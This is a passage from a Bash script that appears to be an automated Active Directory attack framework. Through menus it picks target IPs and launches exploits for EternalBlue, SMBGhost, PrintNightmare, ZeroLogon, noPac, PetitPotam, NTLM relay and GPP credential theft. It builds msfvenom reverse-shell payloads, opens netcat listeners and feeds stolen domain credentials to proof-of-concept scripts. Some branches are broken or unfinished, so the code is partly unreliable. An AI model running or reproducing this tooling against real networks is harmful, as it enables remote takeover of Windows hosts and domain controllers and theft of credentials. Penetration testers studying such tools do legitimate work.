            if grep -q "True" "$PATH_TO_WORKSPACE/known-data/vulns/cve-smbghost_vulns-ip" ; then
                printf "\nChoose among the following vulnerable IP:\n"
                readarray -t list_vulnerable_ips < <(grep "True" "$PATH_TO_WORKSPACE/known-data/vulns/cve-smbghost_vulns-ip")
                select vuln_ip_infos in "${list_vulnerable_ips[@]}" Quit
                do
                    if [[ "$vuln_ip_infos" == "Quit" ]]; then return; fi
                    ip=$(echo "$vuln_ip_infos" | cut -d "," -f1)
                    port=$(echo "$vuln_ip_infos" | cut -d "," -f2)
                    printf "\n%bThe chosen IP to attack : $ip (port: $port).%b\n" "${BLUE}" "${NC}"
                    break
                done
                if [ -z "$ip" ]; then
                    printf "%b\nNo IP selected...%b" "${RED}" "${NC}"
                    return
                fi
                interface="$(get_interface)"
                ip_addr="$(get_ip_listening "$interface")"
                lport=get_value_int 0 65535
                msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST="$ip_addr" LPORT="$lport" -f python -o "$PATH_TO_WORKSPACE/known-data/exploits/shellcodex64_smbghost"
                gnome-terminal -- sh "netcat -lvnp $lport; exec bash"
                python3 smbghost_cve20200796_poc.py -ip "$ip" -p "$port" -f "$PATH_TO_WORKSPACE/known-data/exploits/shellcodex64_smbghost"
            else 
                printf "%b\nNo vulnerable IP found into your file in known-data/vulns%b" "${RED}" "${NC}"
            fi

        # Attack: SMBleed (or CVE-2020-1206)
        elif [[ "$REPLY" == "2" ]]; then
            if grep -q "True" "$PATH_TO_WORKSPACE/known-data/vulns/cve-smbleed_vulns-ip" ; then
                printf "\nChoose among the following vulnerable IP:\n"
                readarray -t list_vulnerable_ips < <(grep "True" "$PATH_TO_WORKSPACE/known-data/vulns/cve-smbleed_vulns-ip")
                select vuln_ip_infos in "${list_vulnerable_ips[@]}" Quit
                do
                    if [[ "$vuln_ip_infos" == "Quit" ]]; then return; fi
                    ip=$(echo "$vuln_ip_infos" | cut -d "," -f1) && port=$(echo "$vuln_ip_infos" | cut -d "," -f2)
                    printf "\n%bThe chosen IP to attack : $ip (port: $port).%b\n" "${BLUE}" "${NC}"
                    break
                done
                if [ -z "$ip" ]; then
                    printf "%b\nNo IP selected...%b" "${RED}" "${NC}"
                    return
                fi
                printf "\n%bNOT IMPLEMENTED FOR NOW%b" "${RED}" "${NC}"
            else 
                printf "%b\nNo vulnerable IP found into your file in known-data/vulns%b" "${RED}" "${NC}"
            fi

        # Attack: Eternal Blue (or MS17-010)
        elif [[ "$REPLY" == "3" ]]; then
            if grep -q "True" "$PATH_TO_WORKSPACE/known-data/vulns/ms17-010-eternalblue-wa_vulns-ip" ; then
                printf "\nChoose among the following vulnerable IP:\n"
                readarray -t list_vulnerable_ips < <(grep "True" "$PATH_TO_WORKSPACE/known-data/vulns/ms17-010-eternalblue-wa_vulns-ip")
                select vuln_ip_infos in "${list_vulnerable_ips[@]}" Quit
                do
                    if [[ "$vuln_ip_infos" == "Quit" ]]; then return; fi
                    ip=$(echo "$vuln_ip_infos" | cut -d "," -f1) && port=$(echo "$vuln_ip_infos" | cut -d "," -f2)
                    printf "\n%bThe chosen IP to attack : $ip (port: $port).%b\n" "${BLUE}" "${NC}"
                    break
                done
                if [ -z "$ip" ]; then
                    printf "%b\nNo IP selected...%b" "${RED}" "${NC}"
                    return
                fi
                interface="$(get_interface)"
                ip_addr="$(get_ip_listening "$interface")"
                lport=get_value_int 0 65535
                msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw  EXITFUNC=thread LHOST="$ip_addr" LPORT="$lport" -o "$PATH_TO_WORKSPACE/known-data/exploits/shellcodex64_eternalblue"
                msfvenom -p windows/meterpreter/reverse_tcp -f raw  EXITFUNC=thread LHOST="$ip_addr" LPORT="$lport" -o "$PATH_TO_WORKSPACE/known-data/exploits/shellcodex86_eternalblue"
                gnome-terminal -- sh -c "netcat -lvnp $lport; exec bash"
                python3 "$PATH_TO_WORKSPACE/POC/eternalblue_ms17010_poc.py" "$ip" "$PATH_TO_WORKSPACE/known-data/exploits/shellcodeall_eternalblue" 13
            else 
                printf "%b\nNo vulnerable IP found into your file in known-data/vulns%b" "${RED}" "${NC}"
            fi

        # Attack: Netapi (or MS08-067)
        elif [[ "$REPLY" == "4" ]]; then
            if grep -q "True" "$PATH_TO_WORKSPACE/known-data/vulns/ms08-67_vulns-ip" ; then
                printf "\nChoose among the following vulnerable IP:\n"
                readarray -t list_vulnerable_ips < <(grep "True" "$PATH_TO_WORKSPACE/known-data/vulns/ms08-67_vulns-ip")
                select vuln_ip_infos in "${list_vulnerable_ips[@]}" Quit
                do
                    if [[ "$vuln_ip_infos" == "Quit" ]]; then return; fi
                    ip=$(echo "$vuln_ip_infos" | cut -d "," -f1) && port=$(echo "$vuln_ip_infos" | cut -d "," -f2)
                    printf "\n%bThe chosen IP to attack : $ip (port: $port).%b\n" "${BLUE}" "${NC}"
                    ip_addr=get_ip_addr
                    printf "\nEnter a port for listening: "
                    read -r lport
                    break
                done
                if [ -z "$ip" ]; then
                    printf "%b\nNo IP selected...%b" "${RED}" "${NC}"
                    return
                fi
                # python3 netapi...
                msfvenom -p windows/shell_reverse_tcp LHOST="$ip_addr" LPORT="$lport" EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows                  
                # if [[ "$os" == "Windows XP" ]]; then
                #     case="1"
                # elif [[ "$os" == "Windows 2000" ]]; then
                #     case="2"
                # elif [[ "$os" == "Windows 2003 SP0" ]]; then
                #     case="3"
                # elif [[ "$os" == "Windows 2003 SP1" ]]; then
                #     case="4"
                # elif [[ "$os" == "Windows XP SP3 French" ]]; then
                #     case="5"
                # elif [[ "$os" == "Windows XP SP3 English" ]]; then
                #     case="6"
                # fi
                printf "\nEnter the type of targeted OS among the following (1=Windows XP, 2=Windows 2000, 3=Windows 2003 SP0, 4=Windows 2003 SP1, 5=Windows XP SP3 French, 6=Windows XP SPR3 English):"
                read -r case
                python3 "$PATH_TO_WORKSPACE/POC/netapi_cve20084250_poc.py" "$ip" "$case" "$port"
                printf "\n%bNOT CORRECTLY IMPLEMENTED FOR NOW%b" "${RED}" "${NC}"
            else 
                printf "%b\nNo vulnerable IP found into your file in known-data/vulns%b" "${RED}" "${NC}"
            fi

        # Attack: NTLM Relayx
        elif [[ "$REPLY" == "6" ]]; then
            if grep -q "True" "$PATH_TO_WORKSPACE/known-data/vulns/smb_signing_disabled" ; then
                printf "\nChoose among the following vulnerable IP:\n"
                readarray -t list_vulnerable_ips < <(grep "True" "$PATH_TO_WORKSPACE/known-data/vulns/smb_signing_disabled")
                select vuln_ip_infos in "${list_vulnerable_ips[@]}" Quit
                do
                    if [[ "$vuln_ip_infos" == "Quit" ]]; then return; fi
                    ip=$(echo "$vuln_ip_infos" | cut -d "," -f1) && port=$(echo "$vuln_ip_infos" | cut -d "," -f2)
                    printf "\n%bThe chosen IP to attack : $ip (port: $port).%b\n" "${BLUE}" "${NC}"
                    break
                done
                if [ -z "$ip" ]; then
                    printf "%b\nNo IP selected...%b" "${RED}" "${NC}"
                    return
                fi
                printf "\n%bNTLMRelayx will be runt over another terminal, please enter your password on it to run it as root (the terminal will sleep 30s waiting for this)\n%b" "${BLUE}" "${NC}"
                gnome-terminal -- sh -c "sudo python3 $PATH_TO_WORKSPACE/POC/ntlmrelayx.py -t $ip -l $PATH_TO_WORKSPACE/known-data/vulns/ntlmrelayx_loot_$ip; exec bash"
                sleep 30s
            else 
                printf "%b\nNo vulnerable IP found into your file in known-data/vulns%b" "${RED}" "${NC}"
            fi

        # ATTACKING RPC PORTS : 135, 593 
        # Attack: PetitPotam with nullsession
        elif [[ "$REPLY" == "5" ]]; then
            if grep -q "True" "$PATH_TO_WORKSPACE/known-data/vulns/petitpotam-nullsession_vulns-ip" ; then
                printf "\nChoose among the following vulnerable IP:\n"
                readarray -t list_vulnerable_ips < <(grep "True" "$PATH_TO_WORKSPACE/known-data/vulns/petitpotam-nullsession_vulns-ip")
                select vuln_ip_infos in "${list_vulnerable_ips[@]}" Quit
                do
                    if [[ "$vuln_ip_infos" == "Quit" ]]; then return; fi
                    ip=$(echo "$vuln_ip_infos" | cut -d "," -f1) && port=$(echo "$vuln_ip_infos" | cut -d "," -f2)
                    printf "\n%bThe chosen IP to attack : $ip (port: $port).%b\n" "${BLUE}" "${NC}"
                    break
                done
                if [ -z "$ip" ]; then
                    printf "%b\nNo IP selected...%b" "${RED}" "${NC}"
                    return
                fi
                printf "\n%bSelect a network interface for listening on:\n%b" "${BLUE}" "${NC}"
                interface="$(get_interface)"
                listening_ip="$(get_ip_listening "$interface")"
                printf "\n%bResponder will be runt over another terminal, please enter your password on it to run Responder as root (the terminal will sleep 30s waiting for this)\n%b" "${BLUE}" "${NC}"
                gnome-terminal -- sh -c "sudo python3 $PATH_TO_WORKSPACE/SCANNER_AD/Responder/Responder.py -I $interface --lm; exec bash"
                sleep 30s
                python3 "$PATH_TO_WORKSPACE/POC/petitpotam_poc.py" "$listening_ip" "$ip" -u "" -p ""
            else 
                printf "%b\nNo vulnerable IP found into your file in known-data/vulns%b" "${RED}" "${NC}"
            fi
                
        # Attack: PrinterBug (or SpoolSample)
        elif [[ "$REPLY" == "7" ]]; then
            if grep -q "True" "$PATH_TO_WORKSPACE/known-data/vulns/printerbug_vulns-ip" ; then
                printf "\nChoose among the following vulnerable IP:\n"
                readarray -t list_vulnerable_ips < <(grep "True" "$PATH_TO_WORKSPACE/known-data/vulns/printerbug_vulns-ip")
                select vuln_ip_infos in "${list_vulnerable_ips[@]}" Quit
                do
                    if [[ "$vuln_ip_infos" == "Quit" ]]; then return; fi
                    ip=$(echo "$vuln_ip_infos" | cut -d "," -f1) && port=$(echo "$vuln_ip_infos" | cut -d "," -f2)
                    printf "\n%bThe chosen IP to attack : $ip (port: $port).%b\n" "${BLUE}" "${NC}"
                    break
                done
                if [ -z "$ip" ]; then
                    printf "%b\nNo IP selected...%b" "${RED}" "${NC}"
                    return
                fi
                printf "\n%bNOT IMPLEMENTED FOR NOW%b" "${RED}" "${NC}"
            else 
                printf "%b\nNo vulnerable IP found into your file in known-data/vulns%b" "${RED}" "${NC}"
            fi

        # Attack: ZeroLogon (or CVE-2020-1472) : TO DO
        elif [[ "$REPLY" == "9" ]]; then
            if grep -q "True" "$PATH_TO_WORKSPACE/known-data/vulns/cve-zerologon_vulns-ip"; then
                printf "\nChoose among the following vulnerable DC:\n"
                readarray -t list_vulnerable_ips < <(grep "True" "$PATH_TO_WORKSPACE/known-data/vulns/cve-zerologon_vulns-ip")
                select vuln_ip_infos in "${list_vulnerable_ips[@]}" Quit
                do
                    if [[ "$vuln_ip_infos" == "Quit" ]]; then return; fi
                    ip=$(echo "$vuln_ip_infos" | cut -d "," -f1) && port=$(echo "$vuln_ip_infos" | cut -d "," -f2) && dc_hostname=$(echo "$vuln_ip_infos" | cut -d "," -f4)
                    printf "\n%bThe chosen DC to attack : $ip (port: $port).%b\n" "${BLUE}" "${NC}"
                    break
                done
                if [ -z "$ip" ]; then
                    printf "%b\nNo DC selected...%b" "${RED}" "${NC}"
                    return
                fi
                python3 "$PATH_TO_WORKSPACE/POC/zerologon_cve20201472_poc.py" "$dc_hostname" "$dc_ip"
            else 
                printf "%b\nNo vulnerable IP found into your file in known-data/vulns%b" "${RED}" "${NC}"
            fi

        # Attack: GPP abuse without account
        elif [[ "$REPLY" == "10" ]]; then
            if ! grep -q "$dc_ip" "$PATH_TO_WORKSPACE/known-data/vulns/gppabuse-wa_vulns-ip"; then
                printf "\nChoose among the following vulnerable DC:\n"
                readarray -t list_vulnerable_ips < <(grep "True" "$PATH_TO_WORKSPACE/known-data/vulns/gppabuse-wa_vulns-ip")
                select vuln_ip_infos in "${list_vulnerable_ips[@]}" Quit
                do
                    if [[ "$vuln_ip_infos" == "Quit" ]]; then return; fi
                    ip=$(echo "$vuln_ip_infos" | cut -d "," -f1) && port=$(echo "$vuln_ip_infos" | cut -d "," -f2) && dc_hostname=$(echo "$vuln_ip_infos" | cut -d "," -f4)
                    printf "\n%bThe chosen DC to attack : $ip (port: $port).%b\n" "${BLUE}" "${NC}"
                    break
                done
                if [ -z "$ip" ]; then
                    printf "%b\nNo DC selected...%b" "${RED}" "${NC}"
                    return
                fi
                printf "\n%bWith anonymous session...%b\n" "${BLUE}" "${NC}"
                python3 "$PATH_TO_WORKSPACE/POC/getgppcreds_scanner.py" ""@"$dc_ip"
            else 
                printf "%b\nNo vulnerable IP found into your file in known-data/vulns%b" "${RED}" "${NC}"
            fi

        # ATTACKING RDG PORTS : 3391 
        # Attack: BlueGate (or CVE-2020-0610)
        elif [[ "$REPLY" == "11" ]]; then
            if grep -q "True" "$PATH_TO_WORKSPACE/known-data/vulns/cve-bluegate_vulns-ip" ; then
                printf "\nChoose among the following vulnerable IP:\n"
                readarray -t list_vulnerable_ips < <(grep "True" "$PATH_TO_WORKSPACE/known-data/vulns/cve-bluegate_vulns-ip")
                select vuln_ip_infos in "${list_vulnerable_ips[@]}" Quit
                do
                    if [[ "$vuln_ip_infos" == "Quit" ]]; then return; fi
                    ip=$(echo "$vuln_ip_infos" | cut -d "," -f1) && port=$(echo "$vuln_ip_infos" | cut -d "," -f2)
                    printf "\n%bThe chosen IP to attack : $ip (port: $port).%b\n" "${BLUE}" "${NC}"
                    
                done
                if [ -z "$ip" ]; then
                    printf "%b\nNo IP selected...%b" "${RED}" "${NC}"
                    return
                fi
                python3 "$PATH_TO_WORKSPACE/POC/bluegate_cve20200610_poc.py" -M dos -P "$port" "$ip"
            else 
                printf "%b\nNo vulnerable IP found into your file in known-data/vulns%b" "${RED}" "${NC}"
            fi
        elif [[ "$REPLY" == "12" ]]; then
            printf "%b\nReturning to the menu...\n%b" "${YELLOW}" "${NC}"
            return
        fi
        printf "%b\n\n=> The files are saved into known-data/exploits or known-data/vulns\n%b" "${BLUE}" "${NC}"
    done
}


exploiting_vulns_with-domain-account(){
	cd "$PATH_TO_WORKSPACE/known-data" || exit
    printf "%b\nEntering into [EXPLOITING VULNERABILITIES WITH DOMAIN ACCOUNT] menu...%b" "${YELLOW}" "${NC}"
    printf "%b\nThe known attacks are:%b" "${BOLD}" "${NC}"
    printf "%b\n=> EternalBlue, PrintNightmare, MIC Remove attack, PetitPotam, sAMAccountName spoofing, Coerce (PrinterBug, DFSCoerce, etc.)%b\n" "${BLUE}" "${NC}"
    PS3="Select actions to carry out: "
    choices_action=(
        "Option 01: Exploiting IP vulnerable to MS17-010 attack"
        "Option 02: Exploiting IP vulnerable to PrintNightmare attack"
        "Option 03: Exploiting IP vulnerable to MIC Remove attack"
        "Option 04: Exploiting IP vulnerable to PetitPotam attack"
        "Option 05: Exploiting IP vulnerable to sAMAccountName spoofing attack"
        "Option 06: Exploiting IP vulnerable to GPP Abuse with account attack"
        "Option 07: Exploiting IP vulnerable to SMB Pipes attacks"
    )
    ad_user_name="";ad_user_pwd="";ad_user_hash="";domain_name="";fqdn="";tld=""
    printf "\nChoose among the following domains:\n"
    readarray -t list_domains < <(tail -n +2 "$PATH_TO_WORKSPACE/known-data/accounts/domain-infos_list.txt")
    select domain in "${list_domains[@]}" Quit
    do
        if [[ "$domain" == "Quit" ]]; then 
            printf "%b\nReturning to the menu...\n%b" "${YELLOW}" "${NC}"
            return
        elif printf '%s\0' "${list_domains[@]}" | grep -Fxqz -- "$domain"; then
            domain_name=$(echo "$domain" | cut -d "," -f2 ) && fqdn=$(echo "$domain" | cut -d "," -f1), tld=$(echo "$domain" | cut -d "," -f3);
            printf "\n%bThe chosen domain : $domain_name (fqdn: $fqdn, tld: $tld).%b\n" "${BLUE}" "${NC}"
            break
        else
            printf "%b\nThe selected option doesn't exist.%b" "${RED}" "${NC}" 
            printf "%b\nReturning to the menu...\n%b" "${YELLOW}" "${NC}"
            return
        fi
    done

    printf "\nChoose among the following users:\n"
    readarray -t list_users < <(tail -n +2 "$PATH_TO_WORKSPACE/known-data/accounts/dom-users_list.txt")
    select user in "${list_users[@]}" Quit
    do
        if [[ "$user" == "Quit" ]]; then
            printf "%b\nReturning to the menu...\n%b" "${YELLOW}" "${NC}"
            return
        elif printf '%s\0' "${list_users[@]}" | grep -Fxqz -- "$user"; then
            domain_name=$(echo "$user" | cut -d "," -f1)
            ad_user_name=$(echo "$user" | cut -d "," -f2)
            ad_user_pwd=$(echo "$user" | cut -d "," -f3)
            ad_user_hash=$(echo "$user" | cut -d "," -f4)
            printf "\n%bThe chosen user : $ad_user_name (password: $ad_user_pwd, hash: $ad_user_hash).%b\n" "${BLUE}" "${NC}"
            break
        else
            printf "%b\nThe selected option doesn't exist.%b" "${RED}" "${NC}" 
            printf "%b\nReturning to the menu...\n%b" "${YELLOW}" "${NC}"
            return
        fi
    done

    while true; do
        printf "%b\n=> Menu%b\n" "${UNDERLINE}" "${NC}"
        select action in "${choices_action[@]}" Quit
        do
            printf "\nSelected action #%s. We will %s\n\n" "$REPLY" "$choice_action";break;
        done
        if [[ "$action" == "Quit" ]]; then
            printf "%b\nReturning to the menu...\n%b" "${YELLOW}" "${NC}"
            return
        fi

        # Attack: Eternal Blue (or MS17-010)
        if [[ "$REPLY" == "1" ]]; then
            if grep -q "True" "$PATH_TO_WORKSPACE/known-data/vulns/ms17-010-eternalblue_vulns-ip" ; then
                printf "\nChoose among the following vulnerable IP:\n"
                readarray -t list_vulnerable_ips < <(grep "True" "$PATH_TO_WORKSPACE/known-data/vulns/ms17-010-eternalblue_vulns-ip")
                select vuln_ip_infos in "${list_vulnerable_ips[@]}" Quit
                do
                    if [[ "$vuln_ip_infos" == "Quit" ]]; then return; fi
                    ip=$(echo "$vuln_ip_infos" | cut -d "," -f1) && port=$(echo "$vuln_ip_infos" | cut -d "," -f2)
                    printf "\n%bThe chosen IP to attack : $ip (port: $port).%b\n" "${BLUE}" "${NC}"
                    break
                done
                if [ -z "$ip" ]; then
                    printf "%b\nNo IP selected...%b" "${RED}" "${NC}"
                    return
                fi
                interface="$(get_interface)"
                ip_addr="$(get_ip_listening "$interface")"
                lport=get_value_int 0 65535
                msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw  EXITFUNC=thread LHOST="$ip_addr" LPORT="$lport" -o "$PATH_TO_WORKSPACE/known-data/exploits/shellcodex64_eternalblue"
                msfvenom -p windows/meterpreter/reverse_tcp -f raw  EXITFUNC=thread LHOST="$ip_addr" LPORT="$lport" -o "$PATH_TO_WORKSPACE/known-data/exploits/shellcodex86_eternalblue"
                gnome-terminal -- sh -c "netcat -lvnp $lport; exec bash"
                python3 "$PATH_TO_WORKSPACE/POC/eternalblue_ms17010_poc.py" "$ip" "$PATH_TO_WORKSPACE/known-data/exploits/shellcodeall_eternalblue" 13 "$ad_user_name" "$ad_user_pwd"
            else 
                printf "%b\nNo vulnerable IP found into your file in known-data/vulns%b" "${RED}" "${NC}"
            fi

        # Attack: PrintNightmare (or CVE-2021-1675 / CVE-34527)
        elif [[ "$REPLY" == "2" ]]; then
            if grep -q "True" "$PATH_TO_WORKSPACE/known-data/vulns/cve-printnightmare_vulns-ip"; then
                printf "\nChoose among the following vulnerable IP:\n"
                readarray -t list_vulnerable_ips < <(grep "True" "$PATH_TO_WORKSPACE/known-data/vulns/cve-printnightmare_vulns-ip")
                select vuln_ip_infos in "${list_vulnerable_ips[@]}" Quit
                do
                    if [[ "$vuln_ip_infos" == "Quit" ]]; then return; fi
                    ip=$(echo "$vuln_ip_infos" | cut -d "," -f1) && port=$(echo "$vuln_ip_infos" | cut -d "," -f2)
                    printf "\n%bThe chosen IP to attack : $ip (port: $port).%b\n" "${BLUE}" "${NC}"
                    break
                done
                if [ -z "$ip" ]; then
                    printf "%b\nNo IP selected...%b" "${RED}" "${NC}"
                    return
                fi
                interface="$(get_interface)"
                listening_ip="$(get_ip_listening "$interface")"
                msfvenom -p windows_reverse_tcp_shell LHOST="$listening_ip" -f dll -o "$PATH_TO_WORKSPACE/known-data/exploits/shellcode_printnightmare.dll"
                x86_64-w64-mingw32-gcc -shared -o "$PATH_TO_WORKSPACE/known-data/exploits/shellcode_printnightmare" "$PATH_TO_WORKSPACE/known-data/exploits/shellcode_printnightmare.c"
                gnome-terminal -- sh -c "bash -c 'netcat -lvnp $lport; exec bash"
                python3 "$PATH_TO_WORKSPACE/POC/CVE-2021-1675.py" -v -u "$ad_user_name" -p "$ad_user_pwd" -d "$domain_name" -dll "$PATH_TO_WORKSPACE/known-data/exploits/shellcode_printnightmare.c" --local-ip "$listening_ip" "$ip"
            else 
                printf "%b\nNo vulnerable IP found into your file in known-data/vulns%b" "${RED}" "${NC}"
            fi

        # Attack: MIC Remove attack (or CVE-2019-1040)
        elif [[ "$REPLY" == "3" ]]; then
            if grep -q "True" "$PATH_TO_WORKSPACE/known-data/vulns/micRA_vulns-ip"; then
                printf "\nChoose among the following vulnerable IP:\n"
                readarray -t list_vulnerable_ips < <(grep "True" "$PATH_TO_WORKSPACE/known-data/vulns/micRA_vulns-ip")
                select vuln_ip_infos in "${list_vulnerable_ips[@]}" Quit
                do
                    if [[ "$vuln_ip_infos" == "Quit" ]]; then return; fi
                    ip=$(echo "$vuln_ip_infos" | cut -d "," -f1) && port=$(echo "$vuln_ip_infos" | cut -d "," -f2)
                    printf "\n%bThe chosen IP to attack : $ip (port: $port).%b\n" "${BLUE}" "${NC}"
                    break
                done
                if [ -z "$ip" ]; then
                    printf "%b\nNo IP selected...%b" "${RED}" "${NC}"
                    return
                fi
                printf "\n%bNOT IMPLEMENTED FOR NOW%b" "${RED}" "${NC}"
            else 
                printf "%b\nNo vulnerable IP found into your file in known-data/vulns%b" "${RED}" "${NC}"
            fi

        # ATTACKING RPC PORTS : 135, 593 
        # Attack: PetitPotam with session      
        elif [[ "$REPLY" == "4" ]]; then
            if grep -q "True" "$PATH_TO_WORKSPACE/known-data/vulns/petitpotam_vulns-ip"; then
                printf "\nChoose among the following vulnerable IP:\n"
                readarray -t list_vulnerable_ips < <(grep "True" "$PATH_TO_WORKSPACE/known-data/vulns/petitpotam_vulns-ip")
                select vuln_ip_infos in "${list_vulnerable_ips[@]}" Quit
                do
                    if [[ "$vuln_ip_infos" == "Quit" ]]; then return; fi
                    ip=$(echo "$vuln_ip_infos" | cut -d "," -f1) && port=$(echo "$vuln_ip_infos" | cut -d "," -f2)
                    printf "\n%bThe chosen IP to attack : $ip (port: $port).%b\n" "${BLUE}" "${NC}"
                    break
                done
                if [ -z "$ip" ]; then
                    printf "%b\nNo IP selected...%b" "${RED}" "${NC}"
                    return
                fi
                # python3 PetitPotam...
                printf "\n%bSelect a network interface for listening on:\n%b" "${BLUE}" "${NC}"
                interface="$(get_interface)"
                listening_ip="$(get_ip_listening "$interface")"
                gnome-terminal -- sh -c "sudo python3 $PATH_TO_WORKSPACE/SCANNER_AD/Responder/Responder.py -I $interface --lm; exec bash"
                python3 "$PATH_TO_WORKSPACE/POC/PetitPotam.py" "$listening_ip" "$ip" "$ad_user_name" "$ad_user_pwd"
            else 
                printf "%b\nNo vulnerable IP found into your file in known-data/vulns%b" "${RED}" "${NC}"
            fi

        # ATTACKING DOMAIN CONTROLLERS
        # Attack: sAMAccountName spoofing/noPac (or CVE-2021-42278)
        elif [[ "$REPLY" == "5" ]]; then
            if grep -q "True" "$PATH_TO_WORKSPACE/known-data/vulns/cve-sAMAccountNameSpoofing_vulns-ip"; then
                printf "\nChoose among the following vulnerable DC:\n"
                readarray -t list_vulnerable_ips < <(grep "True" "$PATH_TO_WORKSPACE/known-data/vulns/cve-sAMAccountNameSpoofing_vulns-ip")
                select vuln_ip_infos in "${list_vulnerable_ips[@]}" Quit
                do
                    if [[ "$vuln_ip_infos" == "Quit" ]]; then return; fi
                    ip=$(echo "$vuln_ip_infos" | cut -d "," -f1) && port=$(echo "$vuln_ip_infos" | cut -d "," -f2) && dc_hostname=$(echo "$vuln_ip_infos" | cut -d "," -f4)
                    printf "\n%bThe chosen DC to attack : $ip (port: $port).%b\n" "${BLUE}" "${NC}"
                    break
                done
                if [ -z "$ip" ]; then
                    printf "%b\nNo DC selected...%b" "${RED}" "${NC}"
                    return
                fi
                python3 "$PATH_TO_WORKSPACE/POC/noPac.py" "$domain_name"/"$ad_user_name":"$ad_user_pwd" -dc-ip "$dc_ip"
            else 
                printf "%b\nNo vulnerable IP found into your file in known-data/vulns%b" "${RED}" "${NC}"
            fi

        # Attack: GPP abuse with an account
        elif [[ "$REPLY" == "6" ]]; then
            if grep -q "True" "$PATH_TO_WORKSPACE/known-data/vulns/gppabuse_vulns-ip"; then
                printf "\nChoose among the following vulnerable DC:\n"
                readarray -t list_vulnerable_ips < <(grep "True" "$PATH_TO_WORKSPACE/known-data/vulns/gppabuse_vulns-ip")
                select vuln_ip_infos in "${list_vulnerable_ips[@]}" Quit
                do
                    if [[ "$vuln_ip_infos" == "Quit" ]]; then return; fi
                    ip=$(echo "$vuln_ip_infos" | cut -d "," -f1) && port=$(echo "$vuln_ip_infos" | cut -d "," -f2) && dc_hostname=$(echo "$vuln_ip_infos" | cut -d "," -f4)
                    printf "\n%bThe chosen DC to attack : $ip (port: $port).%b\n" "${BLUE}" "${NC}"
                    break
                done
                if [ -z "$ip" ]; then
                    printf "%b\nNo DC selected...%b" "${RED}" "${NC}"
                    return
                fi
                python3 "$PATH_TO_WORKSPACE/POC/getgppcreds_scanner.py" "$domain_name"/"$ad_user_name":"$ad_user_pwd"@"$dc_ip"
            else 
                printf "%b\nNo vulnerable IP found into your file in known-data/vulns%b" "${RED}" "${NC}"
            fi
        elif [[ "$REPLY" == "8" ]]; then
            printf "%b\nReturn to the menu...\n%b" "${YELLOW}" "${NC}"
            return
        fi
        printf "%b\n\n=> The files are saved into known-data/exploits or known-data/vulns\n%b" "${BLUE}" "${NC}"
    done
}

scanning_vulns_with-local-account(){
	cd "$PATH_TO_WORKSPACE/known-data" || exit
    printf "%b\nEntering into [SEARCHING VULNERABILITIES WITH LOCAL ACCOUNT] menu...%b" "${YELLOW}" "${NC}"
    printf "%b\nReturn to the menu (it is not still implemented)...\n%b" "${YELLOW}" "${NC}"
}

scanning_vulns_with-local-adm-account(){
	cd "$PATH_TO_WORKSPACE/known-data" || exit
    printf "%b\nEntering into [SEARCHING VULNERABILITIES WITH LOCAL ADMINISTRATOR ACCOUNT] menu...%b" "${YELLOW}" "${NC}"
    printf "%b\nReturn to the menu (it is not still implemented)...\n%b" "${YELLOW}" "${NC}"
}

searching_vulns(){
    printf "%b\nEntering into [SEARCHING VULNERABILITIES] menu...%b" "${YELLOW}" "${NC}"
	cd "$PATH_TO_WORKSPACE/known-data/network" || exit

	while true; do
    	PS3="Select actions to carry out: "
        choices_action=(
            "Option 1: Scanning without any accounts"
            "Option 2: Scanning with a domain account (with low privs)"
            "Option 3: Scanning with a local account (with low privs)"
            "Option 4: Scanning with a local account (with high privs)"
        )
        printf "%b\n=> Menu%b\n" "${UNDERLINE}" "${NC}"
        select choice_action in "${choices_action[@]}" Quit
        do
            printf "\nSelected item #%s. We will %s\n\n" "$REPLY" "$choice_action";break;
        done
        if [[ "$REPLY" == "1" ]]; then
            scanning_vulns_without-account
        elif [[ "$REPLY" == "2" ]]; then
            scanning_vulns_with-domain-account
        elif [[ "$REPLY" == "3" ]]; then
            scanning_vulns_with-local-account
        elif [[ "$REPLY" == "4" ]]; then
            scanning_vulns_with-local-adm-account
        elif [[ "$REPLY" == "5" ]]; then
            printf "%b\nReturn to the menu...\n%b" "${YELLOW}" "${NC}"
            return
        fi
    done
}



exploiting_vulns_with-local-account(){
	cd "$PATH_TO_WORKSPACE/known-data" || exit
    printf "%b\nEntering into [EXPLOITING VULNERABILITIES WITH LOCAL ACCOUNT] menu...%b" "${YELLOW}" "${NC}"
    printf "%b\nReturn to the menu (it is not still implemented)...\n%b" "${YELLOW}" "${NC}"
}

exploiting_vulns_with-local-adm-account(){
	cd "$PATH_TO_WORKSPACE/known-data" || exit
    printf "%b\nEntering into [EXPLOITING VULNERABILITIES WITH LOCAL ADMINISTRATOR ACCOUNT] menu...%b" "${YELLOW}" "${NC}"
    printf "%b\nReturn to the menu (it is not still implemented)...\n%b" "${YELLOW}" "${NC}"
}

exploiting_vulns(){
    printf "%b\nEntering into [EXPLOITING VULNERABILITIES] menu...%b" "${YELLOW}" "${NC}"
	cd "$PATH_TO_WORKSPACE/known-data/network" || exit
    printf "%b\n=> Menu%b\n" "${UNDERLINE}" "${NC}"
    while true; do
        PS3="Select actions to carry out: "
        choices_action=(
            "Option 1: Exploiting without any accounts"
            "Option 2: Exploiting with a domain account (with low privs)"
            "Option 3: Exploiting with a local account (with low privs)"
            "Option 4: Exploiting with a local account (with high privs)"
        )
        select choice_action in "${choices_action[@]}" Quit
        do
            printf "\nSelected item #%s. We will %s\n\n" "$REPLY" "$choice_action";break;
        done
        if [[ "$REPLY" == "1" ]]; then
            exploiting_vulns_without-account
        elif [[ "$REPLY" == "2" ]]; then
            exploiting_vulns_with-domain-account
        elif [[ "$REPLY" == "3" ]]; then
            exploiting_vulns_with-local-account
        elif [[ "$REPLY" == "4" ]]; then
            exploiting_vulns_with-local-adm-account
        elif [[ "$REPLY" == "5" ]]; then
            printf "%b\nReturning to the menu...\n%b" "${YELLOW}" "${NC}"
            return
        fi
    done
}


#######################################################
# => SECTION BLOODHOUND/NEO4J
#######################################################

import_data_bloodhound(){
    FILENAME=$1
    NAME_ATTRIBUTE=$2
    neo4j_username=$3
    neo4j_password=$4
    while read -r IP_vuln port isVulnerable; do
        printf "%b\nImporting data for vulnerability $NAME_ATTRIBUTE...\n%b" "${YELLOW}" "${NC}"
        grep -E "$IP_vuln" "$PATH_TO_WORKSPACE/known-data/accounts/computers_list.csv" | tr ',' ' ' | while read -r cn dnsHostName IP; do
